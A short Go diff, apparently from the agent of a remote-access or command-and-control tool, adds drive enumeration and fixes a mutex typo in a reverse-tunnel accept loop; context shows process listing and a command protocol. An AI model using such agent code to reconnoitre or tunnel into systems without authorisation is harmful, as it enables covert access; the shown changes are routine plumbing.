@@ -793,6 +793,24 @@ func listDirectory(path string) (string, []protocol.DirEntry, error) {
 	return absPath, items, nil
 }
 
+func listDisks() ([]diskEntry, error) {
+	if runtime.GOOS == "windows" {
+		out := make([]diskEntry, 0, 26)
+		for drive := 'A'; drive <= 'Z'; drive++ {
+			root := string([]byte{byte(drive), ':', '\\'})
+			if _, err := os.Stat(root); err == nil {
+				out = append(out, diskEntry{Letter: byte(drive), Type: 3})
+			}
+		}
+		return out, nil
+	}
+
+	if _, err := os.Stat("/"); err != nil {
+		return nil, err
+	}
+	return []diskEntry{{Letter: '/', Type: 3}}, nil
+}
+
 func listProcesses() ([]protocol.ProcessEntry, error) {
 	if runtime.GOOS == "windows" {
 		out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
@@ -1172,9 +1190,9 @@ func reverseAcceptLoop(sess *tunnelSession) {
 		}
 		channelID := nextTunnelChannel()
 		child := &tunnelSession{id: channelID, tunnelType: reverseTunnelType, conn: conn}
-		unnelMu.Lock()
+		tunnelMu.Lock()
 		tunnelSessions[channelID] = child
-		unnelMu.Unlock()
+		tunnelMu.Unlock()
 		w := protocol.NewWriterBE()
 		w.WriteUint32(channelID)
 		queueBinaryResponse(sess.id, protocol.COMMAND_TUNNEL_ACCEPT, w.Bytes())
